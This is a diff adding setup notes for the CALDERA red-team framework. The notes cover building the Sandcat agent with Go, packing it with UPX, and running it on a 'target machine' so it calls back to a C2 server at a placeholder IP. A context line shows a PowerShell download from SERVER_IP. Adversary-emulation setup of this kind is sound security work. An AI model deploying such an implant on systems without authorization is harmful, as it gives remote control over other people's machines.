@@ -63,3 +63,40 @@ Invoke-WebRequest -Uri https://SERVER_IP:8888/file/download -Headers @{"file"="s
 
 
 ```
+
+
+Correct steps to build a Windows agent
+
+Go to the Go agent folder:
+
+cd ~/caldera5/plugins/sandcat/gocat
+
+
+Initialize Go module (needed once):
+
+go mod tidy
+
+
+Build the Windows agent:
+
+GOOS=windows GOARCH=amd64 go build -o sandcat.exe main.go
+
+
+main.go is the entry point for the Sandcat agent.
+
+For Linux: GOOS=linux GOARCH=amd64 go build -o sandcat_linux main.go
+
+Optional: compress the EXE:
+
+upx -9 sandcat.exe
+
+Deploy the agent to Windows
+
+Copy the sandcat.exe to the target machine and run:
+
+.\sandcat.exe -server https://<CALDERA_SERVER_IP>:8888 -group red
+
+
+Replace <CALDERA_SERVER_IP> with your server IP.
+
+The agent should appear in Agents → Windows in the CALDERA UI.
